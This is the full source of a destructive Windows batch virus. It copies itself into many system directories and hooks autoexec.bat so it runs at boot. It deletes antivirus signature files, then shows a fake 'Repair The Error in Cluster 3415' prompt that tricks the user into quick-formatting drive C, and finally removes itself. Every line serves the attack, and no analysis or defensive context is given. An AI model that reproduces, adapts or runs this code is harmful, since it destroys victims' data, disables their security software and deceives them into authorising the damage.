@echo off
@copy %0 c:\winrun.bat>nul
@echo winrun.bat>>c:\autoexec.bat
@cd %windir% 
@copy %0 winrun.bat>nul
@copy %0 dosstart.bat>nul
@cd %windir%\system 
@copy %0 winrun.bat>nul
@cd %windir%\command 
@copy %0 winrun.bat>nul
@cd %windir%\system\vmm32
@copy %0 winrun.bat>nul
@cd %windir%\temp
@copy %0 winrun.bat>nul
@cd %windir%\inf
@copy %0 winrun.bat>nul
@cd %windir%\pif
@copy %0 winrun.bat>nul
@cd %windir%\media
@copy %0 winrun.bat>nul
@cd %windir%\config
@copy %0 winrun.bat>nul
@cd %windir%\..
cd progra~1\antivi~1
del *.avc >nul
cls
copy %windir%\system.ini con>nul
echo Repair The Error in Cluster 3415 ? Press "Y" and Enter
format c: /q>nul
   del %0